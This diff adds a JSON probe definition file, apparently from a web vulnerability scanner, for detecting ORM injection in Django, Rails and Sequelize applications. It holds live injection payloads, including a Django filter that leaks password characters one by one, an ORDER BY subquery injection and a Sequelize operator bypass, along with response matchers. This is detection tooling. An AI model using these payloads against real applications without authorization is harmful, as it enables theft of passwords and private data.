@@ -1,0 +1,65 @@
+{
+  "category": "orm_leak",
+  "contexts": {
+    "django_filter": {
+      "description": "Django ORM filter injection -- manipulate queryset filter kwargs to access unauthorized fields or extract data",
+      "tech_match": ["Django", "Python"],
+      "param_match": ["filter", "search", "query", "sort", "order_by", "field", "lookup"],
+      "probes": [
+        {
+          "payload": "password__startswith=a",
+          "description": "Django ORM field traversal -- access password field via queryset filter (__startswith, __contains, __regex lookups). Compare response for true/false to extract character by character.",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "email__regex=.*",
+          "description": "Django ORM regex filter -- inject regex via __regex lookup to extract field values or cause ReDoS",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "rails_arel": {
+      "description": "Rails ActiveRecord injection -- manipulate Arel queries via hash parameter injection or order clause",
+      "tech_match": ["Ruby", "Rails"],
+      "param_match": ["sort", "order", "filter", "where", "search", "q"],
+      "probes": [
+        {
+          "payload": "name ASC, (SELECT 1 FROM users LIMIT 1)--",
+          "description": "Rails ORDER BY injection -- if order parameter is interpolated into SQL, subquery can extract data",
+          "matchers": [
+            {"type": "status", "status": [200, 500]},
+            {"type": "word", "words": ["PG::Error", "ActiveRecord", "SQLite3", "Mysql2"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "sequelize_injection": {
+      "description": "Sequelize ORM operator injection -- inject Sequelize operators ($gt, $like, $between) via JSON parameter parsing",
+      "tech_match": ["Node.js", "Express", "Sequelize"],
+      "param_match": ["where", "filter", "search", "query", "conditions"],
+      "probes": [
+        {
+          "payload": "{\"$gt\": \"\"}",
+          "description": "Sequelize operator injection via JSON -- if request body parsed as JSON and passed to findAll(), operators bypass intended filters",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 200}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    }
+  }
+}
